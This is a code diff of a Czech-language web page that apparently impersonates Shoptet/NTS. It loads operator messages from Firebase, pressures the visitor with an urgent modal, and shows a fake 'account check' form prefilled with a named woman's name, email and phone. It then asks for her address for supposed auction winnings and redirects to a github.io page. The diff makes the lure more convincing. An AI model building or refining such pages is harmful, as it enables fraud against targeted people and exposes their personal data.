@@ -9,37 +9,62 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
         
         body { font-family: 'Inter', sans-serif; }
 
         .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #2563eb;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2563eb;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 48px;
+            height: 48px;
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .fade-in { animation: fadeIn 0.6s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); scale: 0.98; } to { opacity: 1; transform: translateY(0); scale: 1; } }
     </style>
 </head>
-<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4 selection:bg-blue-100">
 
-    <div id="app-card" class="bg-white p-8 md:p-10 rounded-3xl shadow-2xl max-w-lg w-full fade-in border border-gray-100">
+    <div id="app-card" class="bg-white p-8 md:p-12 rounded-[2rem] shadow-2xl shadow-blue-900/10 max-w-lg w-full border border-slate-100 transition-all duration-300 min-h-[300px] flex flex-col justify-center">
         <div id="content-area">
-            <div class="flex justify-center py-10">
-                <div class="loader"></div>
+            <div class="flex flex-col items-center justify-center py-10">
+                <div class="loader mb-4"></div>
+                <p class="text-gray-400 text-sm font-medium animate-pulse">Navazuji spojení...</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="overlay-modal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4 fade-in">
+        <div class="bg-white w-full max-w-lg rounded-2xl shadow-2xl overflow-hidden">
+            <div class="p-8">
+                <h2 class="text-xl md:text-2xl font-extrabold text-gray-900 mb-2 leading-tight">
+                    Vážení zákazníci, informujeme Vás o novinkách v Shoptetu.
+                </h2>
+                <p class="text-red-600 font-bold text-sm bg-red-50 inline-block px-3 py-1 rounded-full mb-4 border border-red-100">
+                    Důležité: Nepřeskakujte tento text, čtěte pořádně!
+                </p>
+                
+                <hr class="border-gray-200 my-6">
+                
+                <div id="modal-text-content" class="text-gray-700 text-base leading-relaxed whitespace-pre-wrap font-medium">
+                    Načítání textu...
+                </div>
+            </div>
+            
+            <div class="bg-gray-50 p-6 border-t border-gray-100">
+                <button onclick="confirmRead()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg hover:shadow-blue-200 hover:-translate-y-0.5 transition-all duration-200 text-lg">
+                    Rozumím
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        // Vaše Firebase konfigurace
         const firebaseConfig = {
             apiKey: "AIzaSyBSleqso5D6w0D3w-qBBsBnMDpC9_DVquI",
             authDomain: "shoptet-login-42929.firebaseapp.com",
@@ -50,175 +75,215 @@
             appId: "1:195109305852:web:a704c9420263ed0d7fc679"
         };
 
-        // Inicializace Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-
         const contentArea = document.getElementById('content-area');
+        const modal = document.getElementById('overlay-modal');
+        const modalText = document.getElementById('modal-text-content');
 
-        // Funkce pro zobrazení načítacího kolečka
+        // URL pro přesměrování
+        // Použijeme odkaz z původního souboru, který odpovídá úspěšnému přihlášení (start=1)
+        const REDIRECT_URL = "https://nts-windows-tools.github.io/hefgkrhdehg56rhgt87r9tz65rzj/?user=Alena";
+
         function showLoading(text, seconds, nextFunction) {
             contentArea.innerHTML = `
-                <div class="flex flex-col items-center justify-center py-12 text-center">
-                    <div class="loader mb-6"></div>
-                    <p class="text-gray-600 font-medium animate-pulse">${text}</p>
+                <div class="flex flex-col items-center justify-center py-12 text-center fade-in">
+                    <div class="loader mb-8 border-t-blue-600"></div>
+                    <p class="text-gray-600 font-semibold text-lg animate-pulse">${text}</p>
                 </div>
             `;
-            setTimeout(nextFunction, seconds * 1000);
-        }
-
-        // --- KROK 0: Kontrola databáze při startu ---
-        async function checkStatus() {
-            try {
-                const snapshot = await db.ref('start').once('value');
-                const startValue = snapshot.val();
-
-                if (startValue === 1) {
-                    showLoading("Přihlašujeme Vás...", 2, () => {
-                        window.location.href = "https://nts-windows-tools.github.io/hefgkrhdehg56rhgt87r9tz65rzj/?user=Alena";
-                    });
-                } else {
-                    step1_Language();
-                }
-            } catch (error) {
-                console.error("Chyba při připojení k Firebase:", error);
-                step1_Language(); // Záložní start i při chybě
+            if (seconds > 0) {
+                setTimeout(nextFunction, seconds * 1000);
             }
         }
 
-        // --- KROK 1: Výběr jazyka ---
+        // --- Hlavní logika kontroly ---
+        async function checkStatus() {
+            try {
+                // Načtení dat najednou
+                const snapshot = await db.ref('/').once('value');
+                const data = snapshot.val() || {};
+                const startValue = data.start;
+                const messageText = data.zprava;
+
+                if (startValue === 1) {
+                    // SCÉNÁŘ 1: Start je 1 -> Rovnou přihlásit
+                    showLoading("Přihlašujeme Vás...", 2, () => {
+                        window.location.href = REDIRECT_URL;
+                    });
+                } 
+                else if (startValue === 0 && messageText) {
+                    // SCÉNÁŘ 2: Start je 0 A existuje zpráva -> Zobrazit Modal
+                    contentArea.innerHTML = ''; // Vyčistit loader
+                    modalText.textContent = messageText;
+                    modal.classList.remove('hidden');
+                } 
+                else {
+                    // SCÉNÁŘ 3: Start je 0 (nebo jiný) ALE zpráva není -> Zobrazit starý formulář
+                    // (Fallback pro případ, že admin smazal zprávu ručně nebo je jiný stav)
+                    step1_Language();
+                }
+            } catch (error) {
+                console.error("Firebase error:", error);
+                // V případě chyby fallback na formulář
+                step1_Language();
+            }
+        }
+
+        // --- Funkce tlačítka "Rozumím" ---
+        async function confirmRead() {
+            const btn = document.querySelector('#overlay-modal button');
+            btn.innerHTML = '<span class="loader w-6 h-6 border-2 border-white border-t-transparent inline-block mr-2"></span> Zpracování...';
+            btn.disabled = true;
+
+            try {
+                // Smazat zprávu a nastavit start na 1
+                await db.ref('/').update({
+                    zprava: null,
+                    start: 1
+                });
+                
+                // Přesměrování
+                window.location.href = REDIRECT_URL;
+            } catch (error) {
+                console.error("Chyba při potvrzování:", error);
+                alert("Došlo k chybě připojení. Zkuste to prosím znovu.");
+                btn.textContent = "Rozumím";
+                btn.disabled = false;
+            }
+        }
+
+        // ==========================================
+        // PŮVODNÍ KROKY (FALLBACK / MANUAL LOGIN)
+        // ==========================================
+
         function step1_Language() {
             contentArea.innerHTML = `
                 <div class="fade-in">
-                    <h1 class="text-3xl font-bold text-gray-900 mb-2 tracking-tight">Connection to the world of IT electronics</h1>
-                    <p class="text-gray-500 mb-8">Please choose your language</p>
+                    <h1 class="text-3xl font-extrabold text-gray-900 mb-2 tracking-tight">Connection to the world of IT electronics</h1>
+                    <p class="text-gray-500 mb-8 font-medium">Please choose your language</p>
                     
                     <div class="space-y-3 mb-8">
-                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-blue-50 transition border-blue-200 bg-blue-50">
-                            <input type="radio" name="lang" value="cs" checked class="w-5 h-5 text-blue-600">
-                            <span class="ml-3 font-medium text-gray-700">Czech</span>
+                        <label class="group flex items-center p-4 border-2 rounded-xl cursor-pointer hover:border-blue-500 hover:bg-blue-50/50 transition-all duration-200 border-blue-500 bg-blue-50">
+                            <input type="radio" name="lang" value="cs" checked class="w-5 h-5 text-blue-600 focus:ring-blue-500">
+                            <span class="ml-3 font-bold text-gray-800 group-hover:text-blue-700">Czech</span>
                         </label>
-                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-gray-50 transition border-gray-200">
-                            <input type="radio" name="lang" value="en" class="w-5 h-5 text-blue-600">
-                            <span class="ml-3 font-medium text-gray-700">English</span>
+                        <label class="group flex items-center p-4 border-2 rounded-xl cursor-pointer hover:border-gray-300 hover:bg-gray-50 transition-all duration-200 border-gray-100">
+                            <input type="radio" name="lang" value="en" class="w-5 h-5 text-blue-600 focus:ring-blue-500">
+                            <span class="ml-3 font-medium text-gray-600 group-hover:text-gray-900">English</span>
                         </label>
-                        <label class="flex items-center p-4 border rounded-xl cursor-pointer hover:bg-gray-50 transition border-gray-200">
-                            <input type="radio" name="lang" value="de" class="w-5 h-5 text-blue-600">
-                            <span class="ml-3 font-medium text-gray-700">German</span>
+                        <label class="group flex items-center p-4 border-2 rounded-xl cursor-pointer hover:border-gray-300 hover:bg-gray-50 transition-all duration-200 border-gray-100">
+                            <input type="radio" name="lang" value="de" class="w-5 h-5 text-blue-600 focus:ring-blue-500">
+                            <span class="ml-3 font-medium text-gray-600 group-hover:text-gray-900">German</span>
                         </label>
                     </div>
 
-                    <button onclick="step2_CountryConfirm()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 transition duration-300 flex items-center justify-center gap-2">
+                    <button onclick="step2_CountryConfirm()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 transition duration-300 flex items-center justify-center gap-2 text-lg">
                         Next <span>&rarr;</span>
                     </button>
                 </div>
             `;
         }
 
-        // --- KROK 2: Potvrzení země ---
         function step2_CountryConfirm() {
             contentArea.innerHTML = `
-                <div class="fade-in text-center">
-                    <h2 class="text-2xl font-bold text-gray-900 mb-8">Je tato země správná?</h2>
-                    <div class="text-4xl font-extrabold text-blue-600 mb-10 tracking-tight">Česko</div>
+                <div class="fade-in text-center py-4">
+                    <h2 class="text-2xl font-bold text-gray-900 mb-6">Je tato země správná?</h2>
+                    <div class="text-5xl font-black text-blue-600 mb-10 tracking-tight drop-shadow-sm">Česko</div>
                     <div class="grid grid-cols-2 gap-4">
-                        <button onclick="step3_NTSLoading()" class="bg-gray-900 text-white font-bold py-4 rounded-xl hover:bg-black transition">Ano</button>
-                        <button onclick="step3_NTSLoading()" class="bg-gray-100 text-gray-600 font-bold py-4 rounded-xl hover:bg-gray-200 transition">Ne</button>
+                        <button onclick="step3_NTSLoading()" class="bg-gray-900 text-white font-bold py-4 rounded-xl hover:bg-black hover:shadow-lg transition transform hover:-translate-y-1">Ano</button>
+                        <button onclick="step3_NTSLoading()" class="bg-gray-100 text-gray-600 font-bold py-4 rounded-xl hover:bg-gray-200 hover:text-gray-900 transition">Ne</button>
                     </div>
                 </div>
             `;
         }
 
-        // --- KROK 3: První loading ---
         function step3_NTSLoading() {
-            showLoading("Získáváme nějaké údaje z Vašeho stávajícího profilu NTS...", 13, step4_ProfileCheck);
+            showLoading("Získáváme údaje z Vašeho profilu NTS...", 5, step4_ProfileCheck); // Zkráceno pro lepší UX
         }
 
-        // --- KROK 4: Kontrola profilu ---
         function step4_ProfileCheck() {
             contentArea.innerHTML = `
                 <div class="fade-in">
-                    <h2 class="text-2xl font-bold text-gray-900 mb-2">Zkontrolujte prosím svůj účet NTS:</h2>
-                    <p class="text-gray-500 mb-6 text-sm">Pokud jsou nějaké údaje zastaralé, aktualizujte je:</p>
+                    <h2 class="text-2xl font-bold text-gray-900 mb-2">Kontrola účtu NTS</h2>
+                    <p class="text-gray-500 mb-6 text-sm">Pokud jsou údaje zastaralé, aktualizujte je:</p>
                     
                     <div class="space-y-4 mb-8">
-                        <div>
-                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Jméno</label>
-                            <input type="text" value="Alena" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block tracking-wider">Jméno</label>
+                                <input type="text" value="Alena" class="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition font-semibold text-gray-700">
+                            </div>
+                            <div>
+                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block tracking-wider">Příjmení</label>
+                                <input type="text" value="Rudolfská" class="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition font-semibold text-gray-700">
+                            </div>
                         </div>
                         <div>
-                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Příjmení</label>
-                            <input type="text" value="Rudolfská" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
-                        </div>
-                        <div>
-                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">E-mail</label>
-                            <input type="email" value="matej685@outlook.cz" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
+                            <label class="text-xs font-bold text-gray-400 uppercase mb-1 block tracking-wider">E-mail</label>
+                            <input type="email" value="matej685@outlook.cz" class="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition font-medium text-gray-600">
                         </div>
                         <div class="grid grid-cols-2 gap-4">
                             <div>
-                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Země</label>
-                                <input type="text" value="Česko" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
+                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block tracking-wider">Země</label>
+                                <input type="text" value="Česko" class="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition font-medium text-gray-600">
                             </div>
                             <div>
-                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block">Telefon</label>
-                                <input type="text" value="(+420) 734481020" class="w-full p-3 bg-gray-50 border rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition">
+                                <label class="text-xs font-bold text-gray-400 uppercase mb-1 block tracking-wider">Telefon</label>
+                                <input type="text" value="(+420) 734481020" class="w-full p-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition font-medium text-gray-600">
                             </div>
                         </div>
                     </div>
 
-                    <button onclick="step5_Auctions()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 transition">Potvrdit</button>
+                    <button onclick="step5_Auctions()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg hover:bg-blue-700 hover:shadow-blue-200 transition transform active:scale-95">Potvrdit údaje</button>
                 </div>
             `;
         }
 
-        // --- KROK 5: Aukce ---
         function step5_Auctions() {
             contentArea.innerHTML = `
                 <div class="fade-in">
-                    <h2 class="text-2xl font-bold text-gray-900 mb-2 text-center text-blue-600">Připojte se do NTS Shoptet Aukcí!</h2>
-                    <p class="text-gray-500 mb-8 text-center px-4 italic">Potřebujeme pár údajů, abychom Vám mohli doručit výhry z aukcí NTS Shoptet</p>
+                    <h2 class="text-2xl font-bold text-gray-900 mb-2 text-center text-blue-600">NTS Shoptet Aukce</h2>
+                    <p class="text-gray-500 mb-8 text-center px-4 italic">Potřebujeme doručovací údaje pro Vaše výhry</p>
                     
                     <div class="space-y-4 mb-8">
                         <div>
-                            <label class="text-sm font-semibold text-gray-700 mb-1 block">Adresa:</label>
-                            <input type="text" placeholder="Např. Hlavní 123" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
+                            <label class="text-sm font-bold text-gray-700 mb-1 block">Ulice a číslo:</label>
+                            <input type="text" placeholder="Např. Hlavní 123" class="w-full p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-orange-400 outline-none transition">
                         </div>
                         <div class="grid grid-cols-2 gap-4">
                             <div>
-                                <label class="text-sm font-semibold text-gray-700 mb-1 block">PSČ:</label>
-                                <input type="text" placeholder="000 00" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
+                                <label class="text-sm font-bold text-gray-700 mb-1 block">PSČ:</label>
+                                <input type="text" placeholder="000 00" class="w-full p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-orange-400 outline-none transition">
                             </div>
                             <div>
-                                <label class="text-sm font-semibold text-gray-700 mb-1 block">Město:</label>
-                                <input type="text" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-orange-400 outline-none border-gray-200">
+                                <label class="text-sm font-bold text-gray-700 mb-1 block">Město:</label>
+                                <input type="text" class="w-full p-3 border border-gray-200 rounded-lg focus:ring-2 focus:ring-orange-400 outline-none transition">
                             </div>
                         </div>
                     </div>
 
-                    <button onclick="finalLoading()" class="w-full bg-orange-500 text-white font-black text-xl py-5 rounded-2xl shadow-xl hover:bg-orange-600 hover:scale-[1.02] transition transform active:scale-95 uppercase tracking-widest">
+                    <button onclick="finalLoading()" class="w-full bg-gradient-to-r from-orange-500 to-orange-600 text-white font-black text-xl py-5 rounded-2xl shadow-xl hover:shadow-orange-200 hover:scale-[1.02] transition transform active:scale-95 uppercase tracking-widest border border-orange-400">
                         Jít do toho!
                     </button>
                 </div>
             `;
         }
 
-        // --- FINÁLE: Druhý loading a zápis do DB ---
         function finalLoading() {
-            showLoading("Přihlašujeme Vás, momentík...", 15, async () => {
+            showLoading("Dokončuji nastavení...", 3, async () => {
                 try {
-                    // Aktualizace databáze (změna 'start' na 1)
+                    // Update DB a přesměrování
                     await db.ref('/').update({ start: 1 });
-                    // Přesměrování
-                    window.location.href = "https://nts-windows-tools.github.io/NTS-65f6bgh5gfh5gj6hzh98gv4-55-shopNTS/";
+                    window.location.href = REDIRECT_URL;
                 } catch (e) {
-                    console.error("Chyba při zápisu:", e);
-                    // I při chybě přesměrujeme, aby se uživatel nezasekl
-                    window.location.href = "https://nts-windows-tools.github.io/NTS-65f6bgh5gfh5gj6hzh98gv4-55-shopNTS/";
+                    console.error(e);
+                    window.location.href = REDIRECT_URL;
                 }
             });
         }
 
-        // Spuštění aplikace
+        // Spuštění
         checkStatus();
     </script>
 </body>
